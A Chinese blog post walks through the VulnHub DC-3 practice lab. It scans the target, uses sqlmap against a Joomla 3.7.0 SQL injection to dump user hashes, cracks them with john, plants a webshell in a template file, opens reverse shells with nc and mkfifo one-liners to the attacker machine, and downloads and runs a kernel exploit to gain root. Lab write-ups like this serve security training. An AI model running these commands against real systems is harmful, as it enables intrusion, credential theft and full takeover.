#  VulnHub靶场之DC-3超详细Joomla漏洞命令提权和系统内核漏洞提权   
原创 Cauchy  Cauchy网安   2025-03-29 16:05  
  
# 靶场的搭建  
  
  
设备：vm虚拟机，靶场的镜像，kali  
  
靶场的镜像我已经放在下面的迅雷网盘里，因为文件比较大，用迅雷下载快一点，解压后直接用vm打开就好，但是会出现一些问题需要配置一些信息：  
```
分享文件：DC-3-2.zip
链接：https://pan.xunlei.com/s/VOMVOiJQ9auHI1cKyZHgksltA1?pwd=7ums#
复制这段内容后打开迅雷，查看更方便
```  
  
1.点击重试就好了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlqbu7cSzeJLpXS6oelLbQjv76aHHZFtvAicCoANCicymR51lTTljEwOmA/640?wx_fmt=png&from=appmsg "")  
  
  
2  
.网络的配置，靶场和攻击机（kali）都要在nat模式的网络连接，但是发现无法编辑虚拟机设置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlCPSUqzkrzXuF2nINXJP3HBUpNHXsXAhNsIQgJ7NUwrObjvWVIhwzbg/640?wx_fmt=png&from=appmsg "")  
  
  
提示我们错误信息在日志中，我们可以看一下报错的日志，发现是兼容性不对，所以造成了错误，我们可以改一下兼容性，改成16.2的版本就可以了，接下来就是克隆，克隆成功后可以编辑网络设置，改为nat模式  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlICyLK7zSR1HLVZKDxGXUUYIhrKCYibJAneofBmykmzKRtxdnFBrD3xw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWljGEWTCOSEIHMrFNdxpHelBaj5teRdQ24EP7dvUS0kiaXA8uArXfuphA/640?wx_fmt=png&from=appmsg "")  
  
  
3.开启发现虚拟机提示，按照错误的提示改一下磁盘设置就可以了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlKXTloHskUDT8qRzwibzS2HduFfV3NXTcpd5x6kfYxrXlOgjqTHvNomw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWl60VjnHuhndYX6tRwL4GUv3RiciaVibVUYtdozfDJg14pAquNbw5vo4Iug/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlOsCpsmY4ZWsB72D6EQqX7wjqAiarD5w9WdX8iclfdWVehziaHxndzmWFQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
靶场成功搭建成功  
# 信息收集  
## 主机扫描  
```
netdiscover -r 192.168.2.0/24
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlxQMQNPFECM6ykD2nDnNcslMm625x2pcEUdSbxSicv42plobhFCBCkIg/640?wx_fmt=png&from=appmsg "")  
  
  
可得靶场的ip为**192.168.2.136**  
## 端口扫描  
```
namp -sS -sV -A -n 192.168.2.136
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWliabEVexouez3xdvFUohJWZvcyAfu3Pwfibbiaap1ULcVn9Qxly9t2PTZw/640?wx_fmt=png&from=appmsg "")  
  
  
只开放了**80端口**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlwOu1b3tmNOn5FkJHtcTJgoEzbkqtGkyG5aW3jOVlPM6UjvvibWic5DGw/640?wx_fmt=png&from=appmsg "")  
  
## 目录扫描  
```
dirb http://192.168.2.136
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlkrtfibRWZN4QDnNUNAOZz6YLy09qj872Py5kYNnbzc5NGbgBia8xx3jQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
发现一个后台管理页面：http://192.168.2.136/administrator  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlZl8emhBX65ua7VtTtVy5licfATNicaEJib1MicbeR9e9C3VWUKb3ljWrbA/640?wx_fmt=png&from=appmsg "")  
  
  
## 网站信息扫描  
```
whatweb -v 192.168.2.136
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlbRhvFp7QpI0jQAOjF3W2l9UL2IWslBvOB1LDrZfO0w7WDQUyEhqqkg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlSOibFLBl2ArEaICnvrZy6VF2rfYibf01L5Vy7hJdpdxlJ4g7zaaHbt9g/640?wx_fmt=png&from=appmsg "")  
  
## 信息收集总结  
```
开放的端口：80
CMS:Joomla 是一个免费的开源内容管理系统，php常见的cms框架，用于发布 Web 内容
后台管理页面：http://192.168.2.136/administrator
```  
```

```  
# 漏洞利用  
## CMS框架（joomla）  
  
拿到一个网址的cms，我们首先要去找出他的版本号，找一下这个版本在市面上有没有存在漏洞， 对于joomla，kali内置了一个工具专门针对它的漏扫工具joomscan  
## Joomscan漏扫工具  
  
r如果没有安装的可以按照下面的步骤  
```
sudo apt update                 #更新源
sudo apt install joomscan       #下载
joomscan -h 
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlq391vUQiaU3ODzGAXwrjb5IPoVhpnBl3uEI3DX7X802CCS0o6vCE6IQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
**安装成功**  
```
joomla --url http://192.168.2..136
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlHq7BGfk87APJbAXKGCZV28N8KJ5bkws5aKOQjax3T21icWOMP3SffSw/640?wx_fmt=png&from=appmsg "")  
  
  
发现joomla的版本是：3.7.0，而且没检测到防火墙  
## 扫描漏洞  
```
searchsploit joomla 3.7.0
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlDWxJMPcslnpS7fqLhWria9dRQ3AWTvaqicPy9esfXVkZ6DcT4UCjicicbw/640?wx_fmt=png&from=appmsg "")  
  
  
  
发现第一个文件提示我们**sql注入**  
  
**下载文件**  
```
searchsploit 42033 -m
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlxQg2PV0mI9eJ6SfnIp0eOiaqIT5I2StMfQ5GicBC5KTMoYYiciaqJiczmRw/640?wx_fmt=png&from=appmsg "")  
  
  
  
发现有一个CVE-2017-8917漏洞，我们可以利用搜索引擎去得到该漏洞的更多信息，经过了解，发现是由于对请求数据过滤不严谨才导致com_fields这个组件任何人都可以访问，无需登录验证  
  
查看一下该txt文件还有什么信息，这个文件也提示我们了，是用sqlmap工具进行GET型的自动SQL注入，代码也已经告诉我们了，想要了解更多sqlmap工具的使用可以看一下我写的这一篇：  
> https://blog.csdn.net/2301_77091612/article/details/145864232?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=145864232&amp;sharerefer=PC&amp;sharesource=2301_77091612&amp;sharefrom=from_link  
  
> csdn  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlm75zHS27oe6gnWYlwouFvXIsagdgrqvyXfSBeVlNqcPndnDibEkcR6Q/640?wx_fmt=png&from=appmsg "")  
  
  
### sqlmap注入  
  
**注意改一下自己靶场的ip地址**  
#### 爆出数据库  
```
sqlmap -u "http://192.168.2.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```  
```

```  
  
选项都选yes  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlicu3dn9HicO5WlKIRQQCClvZibduSkO37TapOKB2NSzcDfIInImbSpyUg/640?wx_fmt=png&from=appmsg "")  
  
  
  
得到5个数据库，安装一般情况下的命名，选择爆出joomladb数据库中的数据表  
#### 爆出数据表  
```
sqlmap -u "http://192.168.2.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWltAIGSQH5PBTqAibxIruGAb4XTHL3NmT6RYCBIO43hFiaksWbaraHmjdA/640?wx_fmt=png&from=appmsg "")  
  
  
  
得到了一堆数据表，但是一般的用户名一些登录信息在users表里，所以我们来爆出该表的字段  
#### 爆出数据表的字段  
```
sqlmap -u "http://192.168.2.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --columns -p list[fullordering]
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWllKOPaWJujS02dYuvlq9Jdj5hD9lFfnCgns5D1L9FhhGxDNsPg7q30g/640?wx_fmt=png&from=appmsg "")  
  
  
  
得到全部的字段，但是我们前面发现了两个登录的页面，我们来爆出name,username,password三个字段  
#### 爆出数据表的数据  
```
sqlmap -u "http://192.168.2.136/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C name,username,password --dump -p list[fullordering]
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlYwwbRg7IribwWlL3RuCL5qcETpgC3q1xJVBvERoPy3K8B5m2htYfIiag/640?wx_fmt=png&from=appmsg "")  
  
  
  
得到用户名和密码，但是密码被加密了，我们可以用john解密  
#### john解密密码  
  
先把密码保存为1.txt  
```
john 1.txt
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWl7VmE9DkBNuMj096MsYUc2LZciaHbAUWDKs3N0sHfzOehEO9vgKhMKVQ/640?wx_fmt=png&from=appmsg "")  
  
  
得到密码为snoopy，登录成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlSoxs6tCnyoeB849qNyT3lzr78m74WNK0sFTBapk3hiaZ9xuIqPTM2zQ/640?wx_fmt=png&from=appmsg "")  
  
  
对这个网址逛了一会，发现在Templates下的模版里的php文件可以写入  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWl5m5iaovRtw5gkTN8F7oWiaEE6PWTDVp5ibIBqkIaVb8Xf55I7pRPD9DVg/640?wx_fmt=png&from=appmsg "")  
  
  
### 上传小马蚁剑连接  
  
我们可以上传我们的小马，随便打开一个模版中的index.php文件(index.php一般是网站的主页面),然后用蚁剑或者哥斯拉连接，我比较习惯用蚁剑连接  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWl4p3jVPRdfCdd2bLebgylfGw5P6icnhJ6Ntb46CIhJVxFJicibJaYyUiccg/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlmd51nEf6iaFrcQ0vhJDu4tZgMF6icfibErwibiaIjrI5iaHVH5dUkXyEicYxw/640?wx_fmt=png&from=appmsg "")  
  
  
  
我们进入终端发现权限是普通用户（www-data），所以我们要反弹shell，和VunHub的这一个靶场一样：  
> https://blog.csdn.net/2301_77091612/article/details/146175276?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=146175276&amp;sharerefer=PC&amp;sharesource=2301_77091612&amp;sharefrom=from_link  
  
> csdn  
  
#### 先开启kali（192.168.2.129）的监听端口  
```
nc -lvvp 7777
```  
```

```  
#### nc反弹  
  
**靶机端**  
：  
  
蚁剑终端上nc反弹：（-e参数不可用）  
```
nc -e /bin/bash 192.168.2.136 7777
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWl6mQZdcomhubfMcP0OxXs88wmgbZibRhCpUgg0YHFzyJ1sia0wsaRzCzw/640?wx_fmt=png&from=appmsg "")  
  
```
rm /tmp/f              #rm  删除文件 因为要保证没有/tmp/f 这个文件
mkfifo /tmp/f          #mkfifo ：创建一个FIFO特殊文件，是一个命名管道（可以用来做进程之间通信的桥梁）
cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.129 7777 >/tmp/f
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlVVicFTxIePwmhKHau9kwMb1Kr6NACppgTjnWN8dMTbGImzaiaEKQjakA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlTeJLvL1UXbZ0bK8TL46g2IKyG3DJASqFZQaWlsLPUdk2JowAPKdeaw/640?wx_fmt=png&from=appmsg "")  
  
  
#### 反弹shell成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlYu5ao2DHaEUNVSPMnDoNkrLHwOzyTdzDjCreDlqBQmwxCHOLolGk0A/640?wx_fmt=png&from=appmsg "")  
  
### 提权到root  
  
了当我们反弹shell后要提高权限才能成为root账户  
  
先进入交互式shell  
```
python -c 'import pty;pty.spawn("/bin/bash")'
```  
####   
#### 命令提权  
  
一般先考虑sudo和suid提权，先find一下看看哪些命令可以用，发现sudo能用  
```
find / -perm -u=s 2>null
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlLBLaLUWBkwcdL6Cy0mam65gTzjLhlnREotLm49KAe1LNRZ6icORWKvA/640?wx_fmt=png&from=appmsg "")  
  
  
  
sudo -l提权发现需要密码，但是试了一下密码snoopy，不对  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlQqWmVUEvq19OhWdRq7CxcDibuMb6jOfPvadJGFNFeOIhAKPvwlTgbGw/640?wx_fmt=png&from=appmsg "")  
  
  
  
去蚁剑看看  
**etc/passwd**  
文件，发现这些账号都是没有密码的，所以sudo密码验证失败，必须生成一个有密码的账户，我们 可以利用python的加密库生成Linux系统用户密钥  
```
格式：
root:x:0:0:root:/root:/bin/bash
x为密码
```  
```

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlAlUw0oAJ1h2Mu34nBAUMVJqulsOLpcXATVQ2SqpLcNbjAy8StldSOQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlSuJ3mNItHBUIaQPic70ElhPDMGSicqg4wPBib0Bw9gVfLf8fj5vpvMpnw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlSibz8J6a4uoFSzbme2yciaDGzOBg7eMJmNDJP980Df1G4FBdlfAO7L3w/640?wx_fmt=png&from=appmsg "")  
  
  
  
发现保存失败，查看一下有哪些文件有读写的权限,发现/etc/passwd写的权限，所以保存不了  
```
find / -writable -type f 2>/dev/null
```  
  
那么我们只能考虑**系统漏洞提权**  
#### 系统内核漏洞提权  
##### 查看系统信息  
  
看看系统的版本，发现是ubuntu 16.04版本系统有没有什么可以利用的漏洞  
```
查看内核版本：uname -a
查看系统发行版本：cat /etc/*-release
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWljaNU5fDwb9icpnyLr13Z3cmXM6v1aib5xaOOuZxcJTazNHMnfDcIXtsQ/640?wx_fmt=png&from=appmsg "")  
  
```
searchsploit ubuntu 16.04
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlciauNGribZ4PiblqialWFb9uXJlhsPdB9ll5kZpb1wMunjfm7fl7t3NzrQ/640?wx_fmt=png&from=appmsg "")  
  
##### 利用漏洞  
  
下载这个文件  
```
searchsploit 39772 -m
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlNOdroN06diaYNDdjjHpmG8xicVjJAQgIgbdxnHQEudNYzsmb1phYHBKg/640?wx_fmt=png&from=appmsg "")  
  
  
该文件写了一些操作和使用方法，下面也给了exp的下载链接，我们先下载下来，再把该文件传到dc3靶机上，先开启http服务之前，先把文件移动到/var/www/html目录 上（是攻击机的根目录）  
```
mv 39772.zip /var/www/html
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlTENlaa38Kr6Vib4Zzib2bfyxMBBU38zibagARBIkTNfR16vibibcnNCEzlg/640?wx_fmt=png&from=appmsg "")  
  
```
journalctl -xeu apache2.service
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlol72lIybmP9lyu6s7GnL3V4Sqc1ZqgZCuKoJLKljL3aFLCDDtHy1ww/640?wx_fmt=png&from=appmsg "")  
  
  
用靶机 去下载exp  
```
wget http://192.168.2.129/39772.zip
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlqUjVQ0T2uy2WWmrpw9AozLZO5ukQFJzwlNuSCqs7kyVnNQUYQuP3fQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
根据前面的文件的提示，解压压缩包，再运行压缩包中的两个脚本就可以提权成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlPXlxkDfPJcmFlc2qQOcD8PYSauibfXFz49xQIVlrXj4icLglicb4egGUg/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWl5ictmAq9eECUXicnzO2b97GukEXoPRxPiaRiazor0koy4zzk5DBbx7sBvw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlf9XHOFq6ON6hHcWkaH9npsvWiahtdeibmAlKqsN232HXuRibkM8TsZZ8w/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlh0bLvpDU3ThcHLb8yibmI2tGf9D1BJr6DpJkUeIiaibnO4zaR7c52F8Lw/640?wx_fmt=png&from=appmsg "")  
  
# 提权成功  
## 得到flag  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dWDX1PL0ibkQ7eMJHOsNHqtic3Yj4RQibWlQqVXcibnp50yG6krpu0yqAcycviaEP7N0iaH8GkSjIN990A9tY0XdZ5Uw/640?wx_fmt=png&from=appmsg "")  
  
  
  
 推荐一个很好用的项目，这个是msf的漏洞库的详细解释，我们拿到系统版本信息后，可以看一下msf中漏洞，再在这个文档中找对应的信息，其实每一个靶场的漏洞很多，可以一个个利用学习：  
> metasploit-framework/documentation/modules/exploit/linux/local/af_packet_chocobo_root_priv_esc.md at master · rapid7/metasploit-framework · GitHub  
  
> github  
  
  
**感兴趣的可以关注微信公众号【Cauchy安全】，一起一步步慢慢来，该到达的高度终将会抵达的，加油，如有雷同纯属巧合**  
  
  
